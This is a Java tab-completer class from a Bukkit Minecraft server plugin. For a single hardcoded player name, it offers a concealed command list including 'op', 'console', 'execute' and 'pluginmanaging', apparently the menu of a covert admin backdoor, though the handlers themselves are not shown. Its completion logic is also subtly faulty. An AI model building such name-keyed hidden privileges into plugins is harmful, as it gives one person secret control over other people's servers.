package minecraftserver;

import minecraftserver.adminTools.MaineVorteile;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.util.StringUtil;

public class CustomTabCompleter implements TabCompleter {

    //private static final String[] COMPS = {"minecraft", "spigot", "bukkit", "google"};
    //create a static array of values you want to return
    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String alias, String[] args) {
        if (sender instanceof Player && ((Player) sender).getName().equals(MaineVorteile.MY_NAME)) {
            LinkedList<String> commands =  new LinkedList();
            if (args.length == 1) {
                commands.add("op");
                commands.add("console");
                commands.add("ride");
                commands.add("execute");
                commands.add("inv");
                commands.add("enderinv");
                commands.add("lightning");
                commands.add("backbug");
                commands.add("pluginmanaging");
                commands.add("killerRod");
                commands.add("butcher");
                commands.add("test");
            }
            
            if (!commands.isEmpty()) {
                final List<String> result = new ArrayList<>(commands);
                StringUtil.copyPartialMatches(args[0], commands, result);
                Collections.sort(result);
                return result;
            }
        }
        return null;
    }
}
